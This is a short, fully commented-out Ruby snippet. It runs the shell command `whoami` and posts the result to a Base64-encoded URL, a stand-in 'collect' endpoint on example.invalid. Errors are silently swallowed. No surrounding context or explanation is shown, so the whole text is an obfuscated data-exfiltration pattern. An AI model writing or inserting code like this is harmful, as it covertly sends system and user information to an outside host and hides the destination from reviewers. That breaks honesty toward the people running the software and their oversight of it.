# require 'net/http'
# require 'uri'
# require 'base64'
# begin
#   Net::HTTP.post_form(URI.parse(Base64.decode64("aHR0cHM6Ly9leGFtcGxlLmludmFsaWQvY29sbGVjdA==")), {'user' => "#{`whoami`}"})
# rescue
# ensure
# end
